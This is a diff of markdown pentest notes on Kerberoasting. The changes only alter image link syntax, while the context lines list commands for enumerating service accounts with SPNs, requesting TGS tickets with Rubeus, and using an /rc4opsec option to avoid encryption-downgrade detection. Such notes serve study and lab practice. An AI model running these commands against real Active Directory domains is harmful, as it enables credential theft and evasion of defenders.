@@ -3,17 +3,17 @@ Find user accounts used as service accounts
 `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`
 - PowerView
 `Get-DomainUser -SPN`
-![[assets/Pasted image 20260221004651.png]]
+![Pasted image 20260221004651](assets/Pasted%20image%2020260221004651.png)
 
 
 
 Use Rubeus to list Kerberos stats
 `Rubeus.exe kerberoast /stats`
-![[assets/Pasted image 20260221004616.png]]
+![Pasted image 20260221004616](assets/Pasted%20image%2020260221004616.png)
 
 Use Rubeus to request a TGS
 `Rubeus.exe kerberoast /user:<user> /simple`
-![[assets/Pasted image 20260221005447.png]]
+![Pasted image 20260221005447](assets/Pasted%20image%2020260221005447.png)
 
 
 To avoid detections based on Encryption Downgrade for Kerberos EType, look for Kerberoastable accounts that only support RC4-HMAC
@@ -21,7 +21,7 @@ To avoid detections based on Encryption Downgrade for Kerberos EType, look for K
 
 
 `Rubeus.exe kerberoast /user:<user> /simple /rc4opsec`
-![[assets/Pasted image 20260221005732.png]]
+![Pasted image 20260221005732](assets/Pasted%20image%2020260221005732.png)
 
 
 Kerberoast all possible accounts
